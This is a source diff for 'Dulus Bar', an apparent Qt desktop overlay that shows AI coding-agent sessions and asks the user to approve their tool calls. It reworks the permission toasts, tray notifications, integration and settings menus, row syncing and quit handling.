-        model = (sess.model if sess else "") or payload.get("model", "")
-        tag = _esc(model) if model else "needs approval"
+    def _update_counter(self) -> None:
+        total = len(self.store.permissions)
+        self.toast_counter.setText(f"1 of {total}")
+        self.toast_counter.setVisible(total > 1)
+
+    def _render_permission(self, perm: Permission) -> None:
+        st = style_for(perm.agent)
+        sess = self.store.sessions.get(perm.key)
+        # Title mirrors the macOS surface: agent name + project / model, falling
+        # back to a faint "needs approval" when neither is known yet.
+        tags = [t for t in ((sess.title if sess else ""), (sess.model if sess else "")) if t]
+        tag = _esc(" · ".join(tags)) if tags else "needs approval"
         self.toast_title.setText(
             f"{st.emoji}&nbsp; <b>{_esc(st.display)}</b>"
             f"&nbsp;&nbsp;<span style='color:{TEXT_FAINT};'>{tag}</span>"
         )
-        # ONE clean, elided line for the call — no duplicated text, no messy wrap.
-        self.toast_body.setText(
-            _elide(_permission_call_text(payload.get("tool", ""), payload.get("args", "")))
-        )
+        # Wrapper requests carry raw terminal text as the "tool", hooks a clean
+        # tool name plus a detail block (the full command, a diff excerpt…).
+        detail = perm.detail.strip() or perm.args.strip()
+        if detail:
+            self.toast_body.setText(_elide(perm.tool or "Run a tool?", 90))
+            self.toast_code.setText(self._wrap_code(detail))
+            self.toast_code.setVisible(True)
+        else:
+            self.toast_body.setText(_elide(perm.tool or "Run a tool?", 220))
+            self.toast_code.setVisible(False)
+        self.always_btn.setVisible(perm.can_always)
+        self.always_btn.setToolTip(_esc(f"Don't ask again for {perm.always_label}") if perm.always_label else "")
+        self._update_counter()
+        # Size for the card's real width: adjustSize() measures at the
+        # layout's preferred width and clipped long commands. Re-run both
+        # layouts first, or the height is the previous card's.
+        for layout in (self.toast_card.layout(), self.toast.layout()):
+            if layout is not None:
+                layout.invalidate()
+                layout.activate()
+        self.toast.setFixedHeight(max(120, self.toast.heightForWidth(TOAST_WIDTH)))
         self.toast.setVisible(True)
         self.toast.raise_()
         self.toast_visible = True
         self._position_toast()
 
-    def _resolve_permission(self, approved: bool) -> None:
-        if not self.pending_permissions:
+    # Visual lines the code block shows before it says how much is left.
+    CODE_MAX_LINES = 10
+
+    def _wrap_code(self, detail: str) -> str:
+        """Hard-wrap at the block's real width so nothing is cut off sideways —
+        a long command is never partly hidden off the right edge."""
+        import textwrap
+
+        # card width - shadow margins - card margins - code padding/borders
+        room = TOAST_WIDTH - 28 - 32 - 22
+        advance = QtGui.QFontMetricsF(self.toast_code.font()).horizontalAdvance("M" * 20) / 20
+        cols = max(20, int(room / max(1.0, advance)) - 1)
+        visual: List[str] = []
+        for line in detail.expandtabs(4).splitlines() or [""]:
+            visual.extend(textwrap.wrap(line, cols, break_long_words=True, replace_whitespace=False,
+                                        drop_whitespace=False) or [""])
+        if len(visual) > self.CODE_MAX_LINES:
+            hidden = len(visual) - (self.CODE_MAX_LINES - 1)
+            visual = visual[: self.CODE_MAX_LINES - 1] + [f"… {hidden} more lines"]
+        return "\n".join(visual)
+
+    def _resolve_permission(self, approved: bool, *, always: bool = False) -> None:
+        perm = self.current_permission
+        if perm is None:
             return
-        event = self.pending_permissions.pop(0)
-        self.permission_decision.emit(event.agent, event.session_id, approved)
-        key = (event.agent, event.session_id)
-        if key in self.sessions:
-            self.sessions[key].status = "running"
-            self.sessions[key].message = "approved" if approved else "denied"
-        self._render_next_permission()
+        self.server.decide(perm.request_id, approved, always=always,
+                           agent=perm.agent, session_id=perm.session_id)
+        # Optimistic: the hub confirms with request_resolved, a no-op by then.
+        self.store.resolve(perm.request_id, "approved" if approved else "denied")
+        self.current_permission = None
+        self._sync_permission_card()
         self._refresh_ui()
 
     def _position_toast(self) -> None:
@@ -770,11 +937,35 @@ class DulusBarOverlay(QMainWindow):
             toast_y += self.panel.height() + 8
         self.toast.move(max(0, toast_x), toast_y)
 
+    # --- notifications ----------------------------------------------------
+    def _can_notify(self, key: Tuple[str, str]) -> bool:
+        if self.tray is None or not self.settings["notifications"] or self.settings["do_not_disturb"]:
+            return False
+        now = time.monotonic()
+        if now - self._last_notified.get(key, -NOTIFY_COOLDOWN_S) < NOTIFY_COOLDOWN_S:
+            return False
+        self._last_notified[key] = now
+        return True
+
+    def _notify_permission(self, perm: Permission) -> None:
+        if self._can_notify(perm.key) and self.tray is not None:
+            name = style_for(perm.agent).display
+            self.tray.notify(f"{name} needs your approval", _elide(perm.label(), 120), warning=True)
+
+    def _notify_finished(self, session: Session) -> None:
+        if self.expanded or not self._can_notify(session.key) or self.tray is None:
+            return  # you're already looking at it
+        name = style_for(session.agent).display + (f" · {session.title}" if session.title else "")
+        if session.status == "error":
+            self.tray.notify(f"{name} hit an error", _elide(session.message, 120), warning=True)
+        else:
+            self.tray.notify(f"{name} is done", _elide(session.message or "Your turn", 120))
+
     # --- expand / collapse ----------------------------------------------
     def _panel_height(self) -> int:
-        n = len(self.sessions)
+        n = len(self.store.sessions)
         if n == 0:
-            body = 44  # empty-state label
+            body = max(44, self.empty_label.sizeHint().height())
         else:
             body = n * ROW_HEIGHT + (n - 1) * 2
         # margins(12+12) + header(16) + gap(6) + body
@@ -794,9 +985,13 @@ class DulusBarOverlay(QMainWindow):
             if self.expanded:
                 ph = self._panel_height()
                 self.panel.setFixedHeight(ph)
-                # top(8) + pill(42) + gap(8) + panel + bottom shadow room(16)
-                size = (360, 8 + 42 + 8 + ph + 16)
+                self.panel.setVisible(True)
+                # top(8) + pill(42) + gap(8) + panel + bottom shadow room(16);
+                # never narrower than the pill, or the pill gets clipped.
+                width = max(PANEL_WIDTH, self.pill.sizeHint().width() + 8)
+                size = (width, 8 + 42 + 8 + ph + 16)
             else:
+                self.panel.setVisible(False)
                 size = (
                     max(self.pill.minimumWidth(), self.pill.sizeHint().width() + 8),
                     58,
@@ -815,11 +1010,10 @@ class DulusBarOverlay(QMainWindow):
 
     def _toggle_expand(self) -> None:
         self.expanded = not self.expanded
-        self.panel.setVisible(self.expanded)
         if self.expanded:
             # Brief grace so a quick cursor drift doesn't collapse it instantly.
             self._expand_grace = time.monotonic() + 1.0
-            self._rebuild_rows()
+            self._sync_rows()
         self._apply_geometry()
         self._refresh_ui()
 
@@ -842,31 +1036,37 @@ class DulusBarOverlay(QMainWindow):
 
     def _apply_pill_icon(self, agent: Optional[str]) -> None:
         """Brand bird for Dulus / idle; the agent's own emoji for everyone else."""
-        if (agent is None or is_dulus(agent)) and self._bird_pixmap is not None:
+        bird = (agent is None or style_for(agent).key == "dulus") and self._bird_pixmap is not None
+        key = "bird" if bird else (style_for(agent).emoji if agent else "🦅")
+        if key == getattr(self, "_pill_icon_key", None):
+            return  # re-setting it every second repainted the blurred pill
+        self._pill_icon_key = key
+        if bird:
             self.icon_label.setPixmap(self._bird_pixmap)
         else:
             self.icon_label.clear()
-            self.icon_label.setText(style_for(agent).emoji if agent else "🦅")
+            self.icon_label.setText(key)
 
     # --- notch auto-hide (reveal on hover / activity / permission) -------
     def _style_peek(self, color: str) -> None:
+        if color == getattr(self, "_peek_color", None):
+            return
+        self._peek_color = color
         radius = PEEK_HEIGHT // 2
         self.peek.setStyleSheet(
             f"#peek {{ background-color: {color}; border-radius: {radius}px; }}"
         )
 
+    def _aggregate_color(self) -> str:
+        statuses = {s.status for s in self.store.sessions.values()}
+        for status, color in (("waiting", WARN), ("error", BAD), ("running", GOOD)):
+            if status in statuses:
+                return color
+        return PILL_BORDER
+
     def _refresh_peek(self) -> None:
         """Tint the resting peek so activity is visible without revealing."""
-        statuses = [s.status for s in self.sessions.values()]
-        if "waiting" in statuses:
-            color = WARN
-        elif "error" in statuses:
-            color = BAD
-        elif "running" in statuses:
-            color = GOOD
-        else:
-            color = PILL_BORDER
-        self._style_peek(color)
+        self._style_peek(self._aggregate_color())
 
     def _init_hover_timer(self) -> None:
         self._hover_timer = QTimer(self)
@@ -912,7 +1112,6 @@ class DulusBarOverlay(QMainWindow):
         if time.monotonic() < self._expand_grace:  # honour the just-expanded grace
             return
         self.expanded = False
-        self.panel.setVisible(False)
         self._apply_geometry()
 
     def _reveal(self, *, brief: bool = False, pin: bool = False) -> None:
@@ -923,7 +1122,6 @@ class DulusBarOverlay(QMainWindow):
         if self._autohide and not self.revealed:
             self.revealed = True
             self._apply_geometry()
-            self._refresh_ui()
 
     def _maybe_tuck(self) -> None:
         if not self._autohide or not self.revealed:
@@ -938,81 +1136,105 @@ class DulusBarOverlay(QMainWindow):
         self.revealed = False
         self._apply_geometry()
 
+    def set_autohide(self, enabled: bool) -> None:
+        self.settings.set("autohide", enabled)
+        self._autohide = enabled and not self._autohide_forced_off
+        self.revealed = True if not self._autohide else self.revealed
+        self._apply_geometry()
+
     # --- render ---------------------------------------------------------
-    def _foremost(self) -> Optional[Session]:
-        pool = [s for s in self.sessions.values() if s.status in ("running", "waiting")]
-        pool = pool or list(self.sessions.values())
-        if not pool:
-            return None
-        waiting = [s for s in pool if s.status == "waiting"]
-        pool = waiting or pool
-        return sorted(pool, key=lambda s: s.last_seen, reverse=True)[0]
-
     def _refresh_ui(self) -> None:
-        active = [s for s in self.sessions.values() if s.status in ("running", "waiting")]
-        front = self._foremost()
-
+        front = self.store.foremost()
         if front is not None:
             st = style_for(front.agent)
             self._apply_pill_icon(front.agent)
+            self.pill_dot.set_status(front.status)
+            self.pill_dot.setVisible(True)
             self.status_label.setText(st.display)
             self.meta_label.setText(self._pill_meta(front))
         else:
             self._apply_pill_icon(None)
+            self.pill_dot.setVisible(False)
             self.status_label.setText(APP_NAME)
             self.meta_label.setText("")
 
+        active = self.store.active()
         if active:
             self.count_badge.setText(str(len(active)))
+            waiting = any(s.status == "waiting" for s in active)
+            self._style_badge(WARN if waiting else GOOD)
             self.count_badge.setVisible(True)
         else:
             self.count_badge.setVisible(False)
 
-        self.icon_label.adjustSize()
-        self._prune()
         self._refresh_peek()
         if self.expanded:
-            self._rebuild_rows()
+            self._sync_rows()
         self._apply_geometry()
 
     def _pill_meta(self, session: Session) -> str:
-        if is_dulus(session.agent) and (session.model or session.ctx):
-            st = style_for(session.agent)
-            bits = []
-            if session.model:
-                bits.append(f"<span style='color:{st.accent};'>{session.model}</span>")
-            if session.ctx:
-                bits.append(f"<span style='color:{_ctx_color(session.ctx)};'>ctx {session.ctx}</span>")
-            return " · ".join(bits)
-        msg = (session.message or session.status).strip()
-        return f"<span style='color:{TEXT_FAINT};'>{msg[:32]}</span>"
+        meta = _meta_html(session, style_for(session.agent).accent)
+        if meta and session.status != "waiting":
+            return meta
+        msg = _esc(_fit(session.message or session.status, self.meta_label.font(), PILL_META_PX))
+        color = WARN if session.status == "waiting" else TEXT_FAINT
+        return f"<span style='color:{color};'>{msg}</span>"
 
-    def _rebuild_rows(self) -> None:
-        while self.sessions_container.count():
-            item = self.sessions_container.takeAt(0)
-            if item is None:
-                continue
-            w = item.widget()
-            if w is not None:
-                w.deleteLater()
+    def _claude_connected(self) -> bool:
+        """Cached: the empty state asks every second while it's on screen."""
+        now = time.monotonic()
+        cached = getattr(self, "_claude_cache", None)
+        if cached is None or now - cached[0] > 5.0:
+            from .integrations import claude
 
-        ordered = sorted(self.sessions.values(), key=lambda s: s.last_seen, reverse=True)
-        self.empty_label.setVisible(not ordered)
-        for session in ordered:
-            row = SessionRow(session)
-            row.clicked.connect(self._on_session_click)
-            self.sessions_container.addWidget(row)
+            cached = (now, bool(claude.status().get("installed")))
+            self._claude_cache = cached
+        return cached[1]
 
-    def _prune(self) -> None:
-        cutoff = datetime.now().timestamp() - 1800
-        ghosts = {"_health", "VibeHealth", "DulusHealth", "health"}
-        self.sessions = {
-            k: v
-            for k, v in self.sessions.items()
-            if v.last_seen.timestamp() > cutoff
-            and v.agent not in ghosts
-            and v.session_id not in ("_health", "health")
-        }
+    def _empty_text(self) -> str:
+        if self.server.error is not None:
+            return (f"<span style='color:{BAD};'>Couldn't start the hub on port {self.server.port}.</span>"
+                    "<br>Is another Dulus Bar running? Try <b>dulusbar doctor</b>.")
+        if self._claude_connected():
+            return "No agents yet — start Claude Code or any wrapped agent and it shows up here."
+        return ("No agents yet.<br>Connect Claude Code: right-click → <b>Integrations</b>"
+                ", or run <b>dulusbar hooks install</b>.")
+
+    def _sync_rows(self) -> None:
+        """Update rows in place — rebuilding them every second made them flicker."""
+        ordered = self.store.ordered()
+        keys = [s.key for s in ordered]
+        for key in list(self._rows):
+            if key not in self.store.sessions:
+                row = self._rows.pop(key)
+                self.sessions_container.removeWidget(row)
+                row.deleteLater()
+        for index, session in enumerate(ordered):
+            row = self._rows.get(session.key)
+            if row is None:
+                row = SessionRow(session)
+                row.clicked.connect(self._on_session_click)
+                row.dismissed.connect(self._dismiss_session)
+                self._rows[session.key] = row
+            else:
+                row.update_session(session)
+            if self.sessions_container.indexOf(row) != index:
+                self.sessions_container.insertWidget(index, row)
+        self.empty_label.setVisible(not keys)
+        if not keys:
+            self.empty_label.setText(self._empty_text())
+        self.clear_btn.setVisible(bool(self.store.finished()))
+
+    def _dismiss_session(self, session: Session) -> None:
+        self.server.remove_session(session.agent, session.session_id)
+        self.store.remove_session(session.key)
+        self._refresh_ui()
+
+    def _clear_finished(self) -> None:
+        self.server.clear_finished()
+        for key in self.store.finished():
+            self.store.remove_session(key)
+        self._refresh_ui()
 
     def _on_session_click(self, session: Session) -> None:
         hint = session.terminal_hint
@@ -1020,28 +1242,40 @@ class DulusBarOverlay(QMainWindow):
             w = native.find_window_by_title(hint)
             if w and native.activate_window(w.handle):
                 return
+        if session.pid and (not session.pid_host or session.pid_host == P.host_id()):
+            if native.focus_pid(session.pid):
+                return
         native.jump_to_terminal(hint)
 
     # --- right-click menu (shared by the island AND the tray icon) ------
+    def _menu_style(self) -> str:
+        return (
+            f"QMenu {{ background: {BG}; color: {TEXT}; border: 1px solid {BORDER}; "
+            f"border-radius: 10px; padding: 6px; font-size: 12px; }}"
+            f"QMenu::item {{ padding: 6px 18px; border-radius: 6px; }}"
+            f"QMenu::item:selected {{ background: {BG_HOVER}; }}"
+            f"QMenu::item:disabled {{ color: {TEXT_FAINT}; }}"
+            f"QMenu::separator {{ height: 1px; background: {BORDER}; margin: 6px 8px; }}"
+        )
+
     def _build_menu(self, tray: bool = False) -> QtWidgets.QMenu:
         """The full right-click menu, built in ONE place so the island's menu and
         the tray icon's menu are always identical. They used to be two separate
         copies that drifted — the island's ended up missing entries."""
         menu = QtWidgets.QMenu()
-        menu.setStyleSheet(
-            f"QMenu {{ background: {BG}; color: {TEXT}; border: 1px solid {BORDER}; "
-            f"border-radius: 10px; padding: 6px; font-size: 12px; }}"
-            f"QMenu::item {{ padding: 6px 18px; border-radius: 6px; }}"
-            f"QMenu::item:selected {{ background: {BG_HOVER}; }}"
-            f"QMenu::separator {{ height: 1px; background: {BORDER}; margin: 6px 8px; }}"
-        )
+        self._populate_menu(menu, tray=tray)
+        return menu
+
+    def _populate_menu(self, menu: QtWidgets.QMenu, tray: bool = False) -> None:
+        menu.clear()
+        menu.setStyleSheet(self._menu_style())
 
         # Only the first entry differs: the tray offers "Show island"; the island
         # (already visible) offers Collapse/Expand instead.
         if tray:
             show = menu.addAction("Show island")
             if show is not None:
-                show.triggered.connect(self.show)
+                show.triggered.connect(self._show_island)
         else:
             toggle = menu.addAction("Collapse" if self.expanded else "Expand")
             if toggle is not None:
@@ -1084,7 +1318,16 @@ class DulusBarOverlay(QMainWindow):
             if choose is not None:
                 choose.triggered.connect(self._open_agent_dialog)
 
+        self._add_integrations_menu(menu)
         menu.addSeparator()
+
+        finished = len(self.store.finished())
+        clear = menu.addAction(f"Clear finished ({finished})" if finished else "Clear finished")
+        if clear is not None:
+            clear.setEnabled(bool(finished))
+            clear.triggered.connect(self._clear_finished)
+
+        self._add_settings_menu(menu)
         folder = menu.addAction("Open Dulus Bar folder")
         if folder is not None:
             folder.triggered.connect(self._open_project_folder)
@@ -1095,8 +1338,93 @@ class DulusBarOverlay(QMainWindow):
         menu.addSeparator()
         quit_act = menu.addAction("Quit Dulus Bar")
         if quit_act is not None:
-            quit_act.triggered.connect(QApplication.quit)
-        return menu
+            quit_act.triggered.connect(self.quit_app)
+
+    def quit_app(self) -> None:
+        """Really quit. QApplication.quit() asks every window to close first
+        and gives up when one refuses — and the island refuses (it hides
+        instead), so "Quit" used to leave the app running."""
+        self._quitting = True
+        self.toast.hide()
+        QApplication.exit(0)
+
+    def _add_integrations_menu(self, menu: QtWidgets.QMenu) -> None:
+        from .integrations import claude, codex
+
+        sub = menu.addMenu("🔌  Integrations")
+        if sub is None:
+            return
+        sub.setStyleSheet(menu.styleSheet())
+        for label, module, hint in (
+            ("Claude Code — status + Allow / Deny", claude, "Restart Claude Code sessions to pick it up."),
+            ("Codex — turn-complete alerts", codex, "New Codex sessions will report to the island."),
+        ):
+            st = module.status()
+            act = sub.addAction(label)
+            if act is None:
+                continue
+            act.setCheckable(True)
+            act.setChecked(bool(st.get("installed")))
+            if st.get("error"):
+                act.setEnabled(False)
+                act.setToolTip(st["error"])
+            act.triggered.connect(
+                lambda checked, m=module, n=label.split(" — ")[0], h=hint: self._toggle_integration(m, n, h, checked)
+            )
+
+    def _toggle_integration(self, module, name: str, hint: str, enable: bool) -> None:  # noqa: ANN001
+        from .integrations import ConfigError
+
+        try:
+            if enable:
+                result = module.install()
+                message = f"{name} connected ({result['path']}). {hint}"
+            else:
+                module.uninstall()
+                message = f"{name} disconnected."
+        except ConfigError as exc:
+            QtWidgets.QMessageBox.warning(self, APP_NAME, str(exc))
+            return
+        self._claude_cache = None
+        if self.tray is not None:
+            self.tray.notify(APP_NAME, message)
+        else:
+            QtWidgets.QMessageBox.information(self, APP_NAME, message)
+        self._refresh_ui()
+
+    def _add_settings_menu(self, menu: QtWidgets.QMenu) -> None:
+        sub = menu.addMenu("⚙  Settings")
+        if sub is None:
+            return
+        sub.setStyleSheet(menu.styleSheet())
+
+        def toggle(label: str, checked: bool, handler, enabled: bool = True) -> None:  # noqa: ANN001
+            act = sub.addAction(label)
+            if act is not None:
+                act.setCheckable(True)
+                act.setChecked(checked)
+                act.setEnabled(enabled)
+                act.triggered.connect(handler)
+
+        toggle("Auto-hide (reveal on hover)", self._autohide, self.set_autohide,
+               enabled=not self._autohide_forced_off)
+        toggle("Peek open when an agent finishes", bool(self.settings["reveal_on_activity"]),
+               lambda on: self.settings.set("reveal_on_activity", on))
+        toggle("Notifications", bool(self.settings["notifications"]),
+               lambda on: self.settings.set("notifications", on), enabled=self.tray is not None)
+        toggle("Do not disturb", bool(self.settings["do_not_disturb"]),
+               lambda on: self.settings.set("do_not_disturb", on))
+        toggle("Start at login", autostart.is_enabled(), self._set_autostart)
+
+    def _set_autostart(self, enabled: bool) -> None:
+        try:
+            autostart.enable() if enabled else autostart.disable()
+        except Exception as exc:
+            QtWidgets.QMessageBox.warning(self, APP_NAME, f"Couldn't change Start at login: {exc}")
+
+    def _show_island(self) -> None:
+        self.show()
+        self._reveal(brief=True)
 
     def _show_context_menu(self) -> None:
         # Keep a ref so the menu isn't garbage-collected mid-exec.
@@ -1131,21 +1459,24 @@ class DulusBarOverlay(QMainWindow):
 
     def _python_console(self) -> str:
         """A python with a real console (not pythonw, which has no stdin)."""
-        exe = sys.executable or "python"
-        low = exe.lower()
-        if low.endswith("pythonw.exe"):
-            candidate = exe[:-len("pythonw.exe")] + "python.exe"
-            if Path(candidate).exists():
-                return candidate
-        import shutil
+        return python_console()
 
-        return exe if not low.endswith("pythonw.exe") else (shutil.which("python") or "python")
+    def _wrap_argv(self, display_name: str, command: List[str]) -> List[str]:
+        """argv that runs ``command`` wired to the island.
+
+        Frozen builds (Nuitka / PyInstaller) have no Python to hand a wrapper
+        script to, so they re-invoke themselves: ``DulusBar wrap NAME -- …``.
+        """
+        from .integrations import is_frozen, self_argv
+
+        if is_frozen():
+            return self_argv("wrap", display_name, "--", *command)
+        wrapper = self._wrappers_dir() / "agent_wrapper.py"
+        return [self._python_console(), str(wrapper), display_name, *command]
 
     def _launch_agent(self, display_name: str, command: List[str]) -> None:
-        root = self._repo_root()
-        wrapper = self._wrappers_dir() / "agent_wrapper.py"
-        argv = [self._python_console(), str(wrapper), display_name, *command]
-        ok = native.open_terminal_running(argv, title=display_name, cwd=str(root))
+        argv = self._wrap_argv(display_name, command)
+        ok = native.open_terminal_running(argv, title=display_name, cwd=str(Path.home()))
         if not ok:
             QtWidgets.QMessageBox.warning(
                 self, "Dulus Bar",
@@ -1191,8 +1522,6 @@ class DulusBarOverlay(QMainWindow):
         if p.suffix.lower() == ".py":
             command = [self._python_console(), str(p)]
         elif p.suffix.lower() in (".js", ".mjs", ".ts"):
-            import shutil
-
             node = shutil.which("node") or "node"
             command = [node, str(p)]
         else:
@@ -1271,6 +1600,10 @@ class DulusBarOverlay(QMainWindow):
             QtWidgets.QMessageBox.warning(self, "Dulus Bar", f"Could not open Dulus: {exc}")
 
     def closeEvent(self, a0: Optional[QtGui.QCloseEvent]) -> None:
+        if self._quitting:
+            if a0 is not None:
+                a0.accept()
+            return
         if a0 is not None:
             a0.ignore()
         self.hide()
@@ -1283,6 +1616,7 @@ class TrayApp:
         self.app = app
         self.overlay = overlay
         self.tray: Optional[QtWidgets.QSystemTrayIcon] = None
+        self._icon = QIcon()
 
     def build(self) -> None:
         brand_icon = Path(__file__).resolve().parent / "assets" / "dulus-bird.png"
@@ -1293,7 +1627,7 @@ class TrayApp:
             pixmap = QtGui.QPixmap(64, 64)
             pixmap.fill(QColor(BG))
             icon = QIcon(pixmap)
-
+        self._icon = icon
         self.app.setWindowIcon(icon)
 
         if not QtWidgets.QSystemTrayIcon.isSystemTrayAvailable():
@@ -1313,32 +1647,29 @@ class TrayApp:
 
         ov = self.overlay
         # ONE menu definition, shared with the island's right-click
-        # (DulusBarOverlay._build_menu) so the two never drift apart again.
+        # (DulusBarOverlay._populate_menu), refreshed every time it opens so
+        # checkmarks and detected agents are never stale.
         self._tray_menu = ov._build_menu(tray=True)
+        self._tray_menu.aboutToShow.connect(lambda: ov._populate_menu(self._tray_menu, tray=True))
         self.tray.setContextMenu(self._tray_menu)
         self.tray.show()
+        ov.tray = self
 
-    def _open_project_folder(self) -> None:
-        root = str(self.overlay._repo_root())
-        try:
-            if sys.platform == "win32":
-                os.startfile(root)  # type: ignore[attr-defined]
-            elif sys.platform == "darwin":
-                subprocess.Popen(["open", root])
-            else:
-                subprocess.Popen(["xdg-open", root])
-        except Exception:
-            pass
+    def notify(self, title: str, body: str, warning: bool = False) -> None:
+        if self.tray is None or not self.tray.supportsMessages():
+            return
+        kind = (QtWidgets.QSystemTrayIcon.MessageIcon.Warning if warning
+                else QtWidgets.QSystemTrayIcon.MessageIcon.Information)
+        self.tray.showMessage(title, body, kind, 5000)
 
     def _on_tray_click(self, reason: QtWidgets.QSystemTrayIcon.ActivationReason) -> None:
-        if reason == QtWidgets.QSystemTrayIcon.ActivationReason.DoubleClick:
-            self.overlay.show()
+        if reason in (QtWidgets.QSystemTrayIcon.ActivationReason.DoubleClick,
+                      QtWidgets.QSystemTrayIcon.ActivationReason.Trigger):
+            self.overlay._show_island()
 
 
-def run_overlay() -> None:
-    import sys
-
-    global FONT_FAMILY
+def run_overlay() -> int:
+    global FONT_FAMILY, MONO_FAMILY
 
     # Must happen before the QApplication exists: on Wayland this switches us to
     # XWayland, the only way a client can pin itself to the top of the screen.
@@ -1351,19 +1682,22 @@ def run_overlay() -> None:
     app.setDesktopFileName("dulusbar")
 
     FONT_FAMILY = native.default_font_family()
+    MONO_FAMILY = QtGui.QFontDatabase.systemFont(QtGui.QFontDatabase.SystemFont.FixedFont).family()
     app.setFont(QFont(FONT_FAMILY, 10))
 
-    server = AgentEventServer(port=WS_PORT)
-    server.start()
-
+    server = AgentEventServer(port=P.configured_port(), publish=True)
+    # Subscribe before the hub starts so not a single event is missed.
     overlay = DulusBarOverlay(server)
+    server.start()
     overlay.show()
 
     tray = TrayApp(app, overlay)
     tray.build()
 
-    sys.exit(app.exec())
+    code = app.exec()
+    server.stop()
+    return code
 
 
 if __name__ == "__main__":
-    run_overlay()
+    sys.exit(run_overlay())
